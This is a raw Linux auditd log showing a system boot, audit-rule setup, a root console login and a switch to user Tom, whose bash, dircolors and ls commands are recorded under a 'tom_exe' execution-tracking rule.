type=SYSCALL msg=audit(1789320256.551:14): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffd88ab9ce0 a2=3c a3=0 items=0 ppid=485 pid=509 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320256.551:14): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320256.551:15): op=set audit_failure=1 old=1 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789320256.551:15): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffd88ab9ce0 a2=3c a3=0 items=0 ppid=485 pid=509 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320256.551:15): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320256.551:16): op=set audit_backlog_wait_time=60000 old=15000 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789320256.551:16): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffd88ab9ce0 a2=3c a3=0 items=0 ppid=485 pid=509 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320256.551:16): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=SERVICE_START msg=audit(1789320256.563:17): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_BOOT msg=audit(1789320256.579:18): pid=527 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320256.587:19): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320256.591:20): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789320256.595:21): prog-id=9 op=LOAD
type=BPF msg=audit(1789320256.595:22): prog-id=10 op=LOAD
type=BPF msg=audit(1789320256.595:23): prog-id=11 op=LOAD
type=BPF msg=audit(1789320256.603:24): prog-id=12 op=LOAD
type=SERVICE_START msg=audit(1789320256.639:25): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320256.691:26): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320256.715:27): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=logrotate comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789320256.715:28): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=logrotate comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320256.719:29): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789320259.777:30): prog-id=12 op=UNLOAD
type=SERVICE_START msg=audit(1789320259.781:31): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320259.785:32): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320259.817:33): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789320259.817:34): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320259.825:35): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_RUNLEVEL msg=audit(1789320259.857:36): pid=649 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='old-level=N new-level=5 comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320259.857:37): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789320259.857:38): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789320289.777:39): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_all comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789320289.777:40): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_all comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789320305.661:41): pid=621 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="su" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=failed'UID="root" AUID="unset"
type=USER_LOGIN msg=audit(1789320308.441:42): pid=621 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=login acct="UNKNOWN" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=failed'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789320322.717:43): pid=621 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="root" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789320322.721:44): pid=621 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789320322.721:45): pid=621 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=tty1 old-ses=4294967295 ses=1 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789320322.721:45): arch=c000003e syscall=1 success=yes exit=1 a0=4 a1=7fff140420d0 a2=1 a3=7fff14041de7 items=0 ppid=1 pid=621 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="login" exe="/usr/bin/login" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320322.721:45): proctitle=2F62696E2F6C6F67696E002D70002D2D
type=SERVICE_START msg=audit(1789320322.781:46): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@0 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789320322.785:47): pid=768 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789320322.785:48): pid=768 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789320322.785:49): pid=768 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=2 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789320322.785:49): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fffd5026560 a2=1 a3=7fffd5026277 items=0 ppid=1 pid=768 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="(systemd)" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320322.785:49): proctitle="(systemd)"
type=USER_START msg=audit(1789320322.789:50): pid=768 uid=0 auid=0 ses=2 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_selinux,pam_loginuid,pam_limits,pam_permit,pam_unix,pam_keyinit,pam_systemd acct="root" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="root"
type=BPF msg=audit(1789320322.801:51): prog-id=13 op=LOAD
type=SYSCALL msg=audit(1789320322.801:51): arch=c000003e syscall=321 success=yes exit=8 a0=5 a1=7ffd12684250 a2=90 a3=0 items=0 ppid=1 pid=768 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="systemd" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=bpf AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320322.801:51): proctitle="(systemd)"
type=BPF msg=audit(1789320322.801:52): prog-id=13 op=UNLOAD
type=BPF msg=audit(1789320322.801:53): prog-id=14 op=LOAD
type=SYSCALL msg=audit(1789320322.801:53): arch=c000003e syscall=321 success=yes exit=8 a0=5 a1=7ffd12684300 a2=90 a3=4 items=0 ppid=1 pid=768 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="systemd" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=bpf AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320322.801:53): proctitle="(systemd)"
type=BPF msg=audit(1789320322.801:54): prog-id=14 op=UNLOAD
type=SERVICE_START msg=audit(1789320322.933:55): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@0 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_START msg=audit(1789320322.937:56): pid=621 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_loginuid,pam_selinux,pam_env,pam_env,pam_limits,pam_lastlog,pam_mail,pam_keyinit,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=CRED_ACQ msg=audit(1789320322.937:57): pid=621 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=USER_LOGIN msg=audit(1789320322.937:58): pid=621 uid=0 auid=0 ses=1 subj=unconfined msg='op=login acct="root" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=CONFIG_CHANGE msg=audit(1789320578.001:59): op=set audit_backlog_limit=8192 old=8192 auid=0 ses=1 subj=unconfined res=1AUID="root"
type=SYSCALL msg=audit(1789320578.001:59): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7fff855a6de0 a2=3c a3=0 items=0 ppid=793 pid=807 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320578.001:59): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320578.005:60): op=set audit_failure=1 old=1 auid=0 ses=1 subj=unconfined res=1AUID="root"
type=SYSCALL msg=audit(1789320578.005:60): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7fff855a6de0 a2=3c a3=0 items=0 ppid=793 pid=807 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320578.005:60): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320578.005:61): op=set audit_backlog_wait_time=60000 old=60000 auid=0 ses=1 subj=unconfined res=1AUID="root"
type=SYSCALL msg=audit(1789320578.005:61): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7fff855a6de0 a2=3c a3=0 items=0 ppid=793 pid=807 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320578.005:61): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320578.009:62): auid=0 ses=1 subj=unconfined op=add_rule key="tom_exe" list=4 res=1AUID="root"
type=SYSCALL msg=audit(1789320578.009:62): arch=c000003e syscall=44 success=yes exit=1064 a0=3 a1=7fff855a6ea0 a2=428 a3=0 items=0 ppid=793 pid=807 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320578.009:62): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=DAEMON_END msg=audit(1789320606.841:4485): op=terminate auid=0 uid=0 ses=4294967295 pid=1 subj=unconfined res=successAUID="root" UID="root"
type=DAEMON_START msg=audit(1789320606.909:16): op=start ver=3.0.9 format=enriched kernel=6.1.0-49-amd64 auid=4294967295 pid=819 uid=0 ses=4294967295 subj=unconfined  res=successAUID="unset" UID="root"
type=SYSCALL msg=audit(1789320606.905:66): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffdd082bad0 a2=3c a3=0 items=0 ppid=817 pid=819 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditd" exe="/usr/sbin/auditd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=SOCKADDR msg=audit(1789320606.905:66): saddr=100000000000000000000000SADDR={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 }
type=PROCTITLE msg=audit(1789320606.905:66): proctitle="/sbin/auditd"
type=CONFIG_CHANGE msg=audit(1789320606.925:67): auid=4294967295 ses=4294967295 subj=unconfined op=remove_rule key="tom_exe" list=4 res=1AUID="unset"
type=SYSCALL msg=audit(1789320606.925:67): arch=c000003e syscall=44 success=yes exit=1064 a0=3 a1=7ffcf4d55510 a2=428 a3=0 items=0 ppid=822 pid=833 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=SOCKADDR msg=audit(1789320606.925:67): saddr=100000000000000000000000SADDR={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 }
type=PROCTITLE msg=audit(1789320606.925:67): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320606.925:68): op=set audit_backlog_limit=8192 old=8192 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789320606.925:68): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffcf4d578f0 a2=3c a3=0 items=0 ppid=822 pid=833 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320606.925:68): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320606.929:69): op=set audit_failure=1 old=1 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789320606.929:69): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffcf4d578f0 a2=3c a3=0 items=0 ppid=822 pid=833 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320606.929:69): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320606.929:70): op=set audit_backlog_wait_time=60000 old=60000 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789320606.929:70): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffcf4d578f0 a2=3c a3=0 items=0 ppid=822 pid=833 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320606.929:70): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789320606.929:71): auid=4294967295 ses=4294967295 subj=unconfined op=add_rule key="tom_exe" list=4 res=1AUID="unset"
type=SYSCALL msg=audit(1789320606.929:71): arch=c000003e syscall=44 success=yes exit=1064 a0=3 a1=7ffcf4d579b0 a2=428 a3=0 items=0 ppid=822 pid=833 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789320606.929:71): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=SERVICE_START msg=audit(1789320606.929:72): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789320614.781:73): pid=840 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_rootok acct="Tom" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789320614.781:74): pid=840 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=CRED_ACQ msg=audit(1789320614.781:75): pid=840 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_rootok acct="Tom" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=USER_START msg=audit(1789320614.785:76): pid=840 uid=0 auid=0 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="Tom" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="root"
type=SYSCALL msg=audit(1789320614.785:77): arch=c000003e syscall=59 success=yes exit=0 a0=557e08adca00 a1=557e08ad1db0 a2=7ffd1dd0f330 a3=1eef790408b958e1 items=3 ppid=840 pid=841 auid=0 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="bash" exe="/usr/bin/bash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="root" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789320614.785:77): argc=1 a0="bash"
type=CWD msg=audit(1789320614.785:77): cwd="/etc/audit/rules.d"
type=PATH msg=audit(1789320614.785:77): item=0 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320614.785:77): item=1 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320614.785:77): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789320614.785:77): proctitle="bash"
type=SYSCALL msg=audit(1789320614.793:78): arch=c000003e syscall=59 success=yes exit=0 a0=55f4be8e1b00 a1=55f4be8e0670 a2=55f4be8e0cb0 a3=10 items=3 ppid=841 pid=842 auid=0 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="dircolors" exe="/usr/bin/dircolors" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="root" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789320614.793:78): argc=2 a0="dircolors" a1="-b"
type=CWD msg=audit(1789320614.793:78): cwd="/etc/audit/rules.d"
type=PATH msg=audit(1789320614.793:78): item=0 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320614.793:78): item=1 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320614.793:78): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789320614.793:78): proctitle=646972636F6C6F7273002D62
type=SYSCALL msg=audit(1789320616.989:79): arch=c000003e syscall=59 success=yes exit=0 a0=55f4be9af7c0 a1=55f4be8e06b0 a2=55f4be9ddaa0 a3=768216f1f78166c6 items=3 ppid=841 pid=843 auid=0 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="root" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789320616.989:79): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789320616.989:79): cwd="/etc/audit/rules.d"
type=PATH msg=audit(1789320616.989:79): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320616.989:79): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789320616.989:79): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789320616.989:79): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789320623.281:80): arch=c000003e syscall=59 success=yes exit=0 a0=55f4be9da4d0 a1=55f4be8e0690 a2=55f4be9ddaa0 a3=768216f1f78166c6 items=3 ppid=841 pid=844 auid=0 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="root" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789320623.281:80): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789320623.281:80): cwd="/home/Tom"
